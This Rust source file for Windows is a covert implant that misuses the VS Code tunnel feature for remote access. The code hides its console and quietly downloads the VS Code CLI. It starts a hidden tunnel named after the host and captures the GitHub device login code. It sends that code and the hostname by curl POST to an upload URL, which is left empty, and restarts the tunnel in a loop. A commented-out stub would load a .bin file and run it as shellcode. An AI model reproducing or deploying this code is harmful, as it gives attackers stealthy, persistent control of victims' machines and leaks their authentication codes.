use std::process::{Command, Stdio};
use std::fs;
use std::io::Write;
use regex::Regex;
use winapi::um::winbase::CREATE_NO_WINDOW;
use std::os::windows::process::CommandExt;
use std::path::Path;
use std::fs::File;
use zip::ZipArchive;
use std::thread;
use std::mem;

//hide console
fn hide_console_window() {
    use std::ptr;
    use winapi::um::wincon::GetConsoleWindow;
    use winapi::um::winuser::{ShowWindow, SW_HIDE};

    let window = unsafe {GetConsoleWindow()};
    if window != ptr::null_mut() {
        unsafe {
            ShowWindow(window, SW_HIDE);
        }
    }
}

//check code.exe installation
fn isvscodeinstalled() -> bool {
    let code_path = format!("{}\\Microsoft\\VSCode\\code.exe", 
        std::env::var("LOCALAPPDATA").unwrap_or_default());
    
    if Path::new(&code_path).exists() {
        return true;
    }

    false
}

//download code.exe
fn download(download_url: &str) -> Result<(), Box<dyn std::error::Error>> {

    let response = reqwest::blocking::get(download_url)?;
    let mut zip_file = File::create("vscode_cli.zip")?;
    zip_file.write_all(&response.bytes()?)?;
    

    let vscode_dir = format!("{}\\Microsoft\\VSCode", std::env::var("LOCALAPPDATA")?);
    fs::create_dir_all(&vscode_dir)?;
    
    let zip_file = File::open("vscode_cli.zip")?;
    let mut archive = ZipArchive::new(zip_file)?;
    
    for i in 0..archive.len() {
        let mut file = archive.by_index(i)?;
        let outpath = Path::new(&vscode_dir).join(file.name());
        
        if file.name().ends_with("code.exe") {
            let mut outfile = File::create(&outpath)?;
            std::io::copy(&mut file, &mut outfile)?;
            
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                fs::set_permissions(&outpath, fs::Permissions::from_mode(0o755))?;
            }
        }
    }
    
    //clean downloaded file
    fs::remove_file("vscode_cli.zip")?;
    
    Ok(())
}

//get hostname
fn gethost() -> Result<String, Box<dyn std::error::Error>> {
    let output = Command::new("hostname")
        .output()?;
    let hostname = String::from_utf8_lossy(&output.stdout).trim().to_string();
    Ok(hostname)

}

//write info to file
fn infotofile(file_path: &str,info: String) -> Result<(), Box<dyn std::error::Error>> {
    use std::fs::OpenOptions;

    let mut file = OpenOptions::new()
        .create(true) 
        .append(true) 
        .open(file_path)?;

    writeln!(file, "{}", info)?; 
    Ok(())
}

//start code tunnel
fn startunnel() -> Result<(String, std::process::Child), Box<dyn std::error::Error>> {
    let code_path = format!("{}\\Microsoft\\VSCode\\code.exe", 
        std::env::var("LOCALAPPDATA")?);

    let hostname = gethost()?;

    let mut child = Command::new(&code_path)
        .args(&[
            "--locale",
            "en-US",
            "tunnel",
            "--accept-server-license-terms",
            "--name",
            &hostname
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped()) 
        .spawn()?;
    
    let stdout = child.stdout.take().unwrap();
    let mut reader = std::io::BufReader::new(stdout);
    let mut code = String::new();
    
    use std::io::BufRead;
    for line in reader.lines() {
        if let Ok(line) = line {
            let re = Regex::new(r"code\s([A-Z0-9]{4}-[A-Z0-9]{4})")?;
            if let Some(captures) = re.captures(&line) {
                code = captures.get(1)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();
                if !code.is_empty() {
                    break;
                }
            }
        }
    }

    if code.is_empty() {
        return Err("Unable to find auth code".into());
    }
    
    Ok((code, child))
}

//send github code and hostname 
fn sendata(url: &str, file_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    let file_content = fs::read_to_string(file_path)?;
    
    let output = Command::new("curl")
        .args(&[
            "-X", "POST",
            "--data", &file_content,
            url
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?
        .wait_with_output()?;
    
    if !output.status.success() {
        eprintln!("Curl error: {}", String::from_utf8_lossy(&output.stderr));
        return Err("Unable to send data".into());
    }

    Ok(())
}

//exit active tunnel sessions
fn tunnelogout() -> Result<(), Box<dyn std::error::Error>> {
    let code_path = format!("{}\\Microsoft\\VSCode\\code.exe", 
        std::env::var("LOCALAPPDATA")?);

    Command::new(&code_path)
        .args(&["tunnel", "user", "logout", "--accept-server-license-terms"])
         .creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())  
        .spawn()?;

    Ok(())
}

//  TODO
/* fn binexecuteloop ()-> bool{
    let binpath: String = format!("{}\\Microsoft\\VSCode\\VSUpdater.bin", 
        std::env::var("LOCALAPPDATA").unwrap_or_default());
    
    if Path::new(&binpath).exists() {
            let execdata = fs::read(&binpath);
            let execute: extern "C" fn() -> ! = unsafe {mem::transmute(&execdata as *const _ as *const ())};
            thread::spawn(move || {execute();});
            return true;
        }
    else {
            return false;
    }  
} */

fn main() {
    hide_console_window();
    
    let url: &str = "https://az764295.vo.msecnd.net/stable/97dec172d3256f8ca4bfb2143f3f76b503ca0534/vscode_cli_win32_x64_cli.zip";
    let output_file: &str = "trapconfig.txt";
    let upurl: &str = ""; //url to intercept post requests

    if !isvscodeinstalled(){
        if let Err(e) = download(url){
            eprintln!("Unable to download file: {}", e);
            return;
        }
    }

    match gethost(){
        Ok(hostname) => {
            if let Err(e) = infotofile(output_file, hostname){
                eprintln!("Unable to save hostname: {}", e);
            }
        }
        Err(_) => {}
    }

    let tunnel_handle = thread::spawn(move || {
        if let Ok((code, mut child)) = startunnel() {
            if let Err(e) = infotofile(output_file, code) {
                eprintln!("Unable to save OTP: {}", e);
            }
            
            // Mantain tunnel up and running
            let _ = child.wait(); 
            
            loop {
                if let Ok((_, mut new_child)) = startunnel() {
                    let _ = new_child.wait();
                }
                std::thread::sleep(std::time::Duration::from_secs(5));
            }
        }
    });

    // Safety sleep 
    std::thread::sleep(std::time::Duration::from_secs(2));

    if let Err(e) = sendata(upurl, output_file){
        eprintln!("Unable to send data: {}", e);
        return;
    }

    let _ = tunnel_handle.join();

}
